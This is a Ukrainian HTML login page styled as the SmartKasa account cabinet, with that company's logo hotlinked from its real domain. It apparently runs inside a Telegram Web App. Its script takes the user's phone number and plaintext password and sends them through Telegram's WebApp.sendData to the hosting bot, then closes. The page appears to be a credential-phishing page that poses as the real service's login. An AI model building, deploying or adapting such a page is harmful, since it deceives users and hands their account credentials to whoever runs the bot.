<!DOCTYPE html>
<html lang="uk">
  <head>
    <meta charset="UTF-8">
    <title>Вхід в кабінет</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
      body {
        background-color: #FFFFFF;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        margin: 0;
        padding: 20px;
        display: flex;
        flex-direction: column;
        align-items: center;
        min-height: 100vh;
        box-sizing: border-box;
      }

      .container {
        width: 100%;
        max-width: 400px;
        display: flex;
        flex-direction: column;
        align-items: center;
      }

      .logo {
        display: flex;
        align-items: center;
        margin-bottom: 40px;
        margin-top: 20px;
      }

      .logo-image {
        height: 40px;
        width: auto;
        object-fit: contain;
      }

      h1 {
        font-size: 32px;
        font-weight: 700;
        color: #000000;
        text-align: center;
        margin: 0 0 40px 0;
        letter-spacing: -0.5px;
      }

      .input-group {
        width: 100%;
        margin-bottom: 24px;
      }

      .input-label {
        display: block;
        font-size: 14px;
        font-weight: 500;
        color: #000000;
        margin-bottom: 8px;
        text-align: left;
      }

      .input-field {
        width: 100%;
        height: 56px;
        padding: 0 16px;
        font-size: 16px;
        background-color: #f8fafc;
        border: none;
        border-radius: 12px;
        color: #1a202c;
        box-sizing: border-box;
        transition: background-color 0.2s ease;
      }

      .input-field:focus {
        outline: none;
        background-color: #f1f5f9;
      }

      .input-field::placeholder {
        color: #94a3b8;
      }

      .password-container {
        position: relative;
        width: 100%;
      }

      .eye-icon {
        position: absolute;
        right: 16px;
        top: 50%;
        transform: translateY(-50%);
        width: 20px;
        height: 20px;
        cursor: pointer;
        opacity: 0.6;
        transition: opacity 0.2s ease;
      }

      .eye-icon:hover {
        opacity: 1;
      }

      .eye-icon svg {
        width: 100%;
        height: 100%;
        fill: none;
        stroke: #64748b;
        stroke-width: 2;
      }

      .login-button {
        width: 100%;
        height: 56px;
        background-color: #ff6b35;
        color: white;
        border: none;
        border-radius: 12px;
        font-size: 16px;
        font-weight: 700;
        cursor: pointer;
        transition: background-color 0.2s ease;
        margin-top: 16px;
      }

      .login-button:hover {
        background-color: #e55a2b;
      }

      .login-button:active {
        transform: translateY(1px);
      }

      @media (max-width: 480px) {
        body {
          padding: 16px;
        }
        
        .container {
          max-width: 100%;
        }
        
        h1 {
          font-size: 28px;
        }
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="logo">
        <img
          src="https://cabinet.smartkasa.ua/static/media/logo.f3347507.svg"
          alt="SmartKasa Logo"
          class="logo-image">
      </div>

      <h1>Вхід</h1>

      <div class="input-group">
        <label class="input-label">Введіть Ваш номер телефону</label>
        <input
          type="tel"
          id="phone"
          class="input-field"
          placeholder="+38 (068) 241-79-53"
          value="+38">
      </div>

      <div class="input-group">
        <label class="input-label">Введіть Ваш пароль</label>
        <div class="password-container">
          <input
            type="password"
            id="password"
            class="input-field"
            placeholder="••••••••••">
          <div class="eye-icon" onclick="togglePassword()">
            <svg viewBox="0 0 24 24">
              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
              <circle cx="12" cy="12" r="3" />
            </svg>
          </div>
        </div>
      </div>

      <button class="login-button" onclick="sendLogin()">Далі</button>
    </div>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script>
      function sendLogin() {
        const WebApp = window.Telegram.WebApp;
        const phone = document.getElementById("phone").value.trim();
        const password = document.getElementById("password").value.trim();

        if (!phone || !password) {
          alert("Будь ласка, заповніть усі поля.");
          return;
        }

        WebApp.sendData(JSON.stringify({
          phone_number: phone,
          password: password
        }));
        WebApp.close();
      }

      function togglePassword() {
        const passwordInput = document.getElementById("password");
        const eyeIcon = document.querySelector('.eye-icon svg');
        
        if (passwordInput.type === 'password') {
          passwordInput.type = 'text';
          eyeIcon.innerHTML = `
            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
            <line x1="1" y1="1" x2="23" y2="23"/>
          `;
        } else {
          passwordInput.type = 'password';
          eyeIcon.innerHTML = `
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
            <circle cx="12" cy="12" r="3"/>
          `;
        }
      }

      document.addEventListener('DOMContentLoaded', function() {
        document.getElementById('phone').focus();
      });
    </script>
  </body>
</html>
